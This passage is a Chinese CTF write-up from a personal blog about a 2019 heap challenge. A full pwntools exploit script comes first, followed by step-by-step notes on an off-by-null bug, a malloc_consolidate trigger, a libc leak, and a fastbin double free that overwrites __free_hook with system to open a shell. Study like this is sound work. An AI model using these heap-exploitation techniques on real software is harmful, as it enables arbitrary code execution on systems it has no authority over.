class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,leng,content)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"Your choice: "</span>,<span class="string">"1"</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">"Index: "</span>,str(index))</span><br><span class="line">  p.sendlineafter(<span class="string">"note len: "</span>,str(leng))</span><br><span class="line">  p.sendlineafter(<span class="string">"content: "</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(index)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"Your choice: "</span>,<span class="string">"2"</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">"Index: "</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">"Your choice: "</span>,<span class="string">"3"</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">"Index: "</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">25</span>):</span><br><span class="line">  add(i,<span class="number">0x78</span>,<span class="string">'aaaa'</span>+str(i))<span class="comment">#0-24</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">  delete(i)<span class="comment">#0-6</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice: "</span>,<span class="string">'1'</span>*<span class="number">0x600</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index: "</span>,<span class="string">"50"</span>)<span class="comment"># &gt;31</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">  add(i,<span class="number">0x78</span>,<span class="string">'bbbb'</span>+str(i))<span class="comment">#0-6</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">25</span>, <span class="number">0x78</span>, <span class="string">'25'</span>+<span class="string">"b"</span> * <span class="number">0x76</span>)<span class="comment">#off by null 0x280-&gt;0x200</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">26</span>, <span class="number">0x78</span>, <span class="string">'26'</span>+<span class="string">"b"</span> * <span class="number">0x6e</span>)</span><br><span class="line">add(<span class="number">27</span>, <span class="number">0x78</span>, <span class="string">'27'</span>+<span class="string">"b"</span> * <span class="number">0x6e</span>)</span><br><span class="line">add(<span class="number">28</span>, <span class="number">0x78</span>, <span class="string">'28'</span>+<span class="string">"b"</span> * <span class="number">0x6e</span>)</span><br><span class="line">add(<span class="number">29</span>, <span class="number">0x78</span>, <span class="string">'29'</span>+<span class="string">"b"</span> * <span class="number">0x6e</span>)</span><br><span class="line">add(<span class="number">30</span>, <span class="number">0x78</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">  delete(i)<span class="comment">#0-6 tcache</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">16</span>)</span><br><span class="line">delete(<span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice: "</span>,<span class="string">'1'</span>*<span class="number">0x600</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index: "</span>,<span class="string">"50"</span>)<span class="comment"># &gt;31</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x78</span>, <span class="string">"tcache"</span>+str(i))    <span class="comment"># clear tcache</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">31</span>, <span class="number">0x78</span>, <span class="string">"aaaa31"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(<span class="string">"27"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x3ebc40</span></span><br><span class="line"></span><br><span class="line">free_hook = libc_addr + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">system = libc_addr + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x78</span>, <span class="string">"aaaa10"</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">27</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x78</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x78</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x78</span>, p64(system))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(<span class="string">"30"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这个题目配了个 libc 2.27 的，所以应该是在 ubuntu 18 下的<br>限制了 size 的大小要小于等于 0x78，存在 off by null</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1602985542994-67dd5e86-2e61-4dd6-91b9-9572b61d4d6d.png#align=left&display=inline&height=334&margin=%5Bobject%20Object%5D&name=image.png&originHeight=505&originWidth=635&size=39820&status=done&style=none&width=420" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>首先把 tcache 填满，接下来 free 的那些就会放到 fastbin 中了</p>
+<p>如果 scanf 读入的是一个很大的数的话他就会去申请一块空间，如果这个空间申请的足够大就能触发 malloc_consolidate，从而合并 fastbin 放到 unsorted bin 中去<br>所以，我们在 scanf 的时候去发送很大的一个数比如 ‘1’*600 就能让前面那些 fastbin 合并</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1603074352821-640b97e0-d0e1-419b-855c-83d8500c8a91.png#align=left&display=inline&height=349&margin=%5Bobject%20Object%5D&name=image.png&originHeight=504&originWidth=898&size=146494&status=done&style=none&width=621" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>再把之前放在 tcache 中的申请回来，然后去申请一个 chunk，正常情况应该是：把 unsorted bin 中那块 0x300 分成 0x80 与 0x280，但是如果全部写上加上后面那个 off by null 就会把 0x280 的 size 给改掉，改为 0x200</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1603074440243-c9263169-fd14-4041-a807-1daea39f1256.png#align=left&display=inline&height=336&margin=%5Bobject%20Object%5D&name=image.png&originHeight=468&originWidth=895&size=139899&status=done&style=none&width=643" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后把那 0x200 申请掉，再申请的话就从 top chunk 中划分了(/bin/sh 那个)，但是此时图中 aaaa16 那里的 prev_size 依然是 0x280</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1603074566279-0406d3a2-8cc5-4c93-a19d-10ff3723d2ed.png#align=left&display=inline&height=442&margin=%5Bobject%20Object%5D&name=image.png&originHeight=646&originWidth=896&size=182083&status=done&style=none&width=613" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>这时候先把 tcache 填满了，再去 free 掉 aaaa16 那个，然后再次触发 malloc_consolidate 就会再给我们一个 0x300 大小的 free chunk（aaaa16 跟它前面那块）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1603074686178-31e0b7f2-6d0d-40aa-b379-d992812ac761.png#align=left&display=inline&height=359&margin=%5Bobject%20Object%5D&name=image.png&originHeight=521&originWidth=899&size=153285&status=done&style=none&width=619" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>先把 tcache 中的都申请完，然后再去申请一个，现在再去 check index27 的就能泄露出 unsorted bin 的地址</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1603075003247-4d29e4a1-4e14-47d3-870a-c665d6a7cb80.png#align=left&display=inline&height=449&margin=%5Bobject%20Object%5D&name=image.png&originHeight=665&originWidth=901&size=181333&status=done&style=none&width=608" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后申请一个 index10，这时候正好申请到 index27 那里，那么接下来就是 fastbin double free 了，可以对着这个释放两次，一次 free(index27)，一次 free(index10)，然后把 free_hook 改为 system 的地址，然后去 free(index30) 也就是前面写入 /bin/sh 的那一个 chunk</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1603076030616-55124438-71b0-44c5-bdb1-dd47f458b30a.png#align=left&display=inline&height=260&margin=%5Bobject%20Object%5D&name=image.png&originHeight=339&originWidth=427&size=42375&status=done&style=none&width=329" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>参考：<a href="https://wzt.ac.cn/2019/11/04/sdnisc2019/" target="_blank" rel="noopener">https://wzt.ac.cn/2019/11/04/sdnisc2019/</a></p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2022-10-03T13:52:43.634Z" itemprop="dateUpdated">2022-10-03 21:52:43</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="https://yichen115.github.io">
+            <img src="/img/avatar.png" alt="yichen">
+            yichen
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/06/23/ygucy4/&title=《2019-深思杯》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/06/23/ygucy4/&title=《2019-深思杯》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/06/23/ygucy4/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《2019-深思杯》 — yichen's blog&url=https://yichen115.github.io/2020/06/23/ygucy4/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/06/23/ygucy4/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/06/25/owh91m/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">BUU-PWN题（41-80）</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/06/22/olf7wy/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">AI Web 1.0</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yichen &copy; 2020 - 2022</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/06/23/ygucy4/&title=《2019-深思杯》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/06/23/ygucy4/&title=《2019-深思杯》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/06/23/ygucy4/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《2019-深思杯》 — yichen's blog&url=https://yichen115.github.io/2020/06/23/ygucy4/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/06/23/ygucy4/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yichen115.github.io/2020/06/23/ygucy4/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '记得回来啊！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
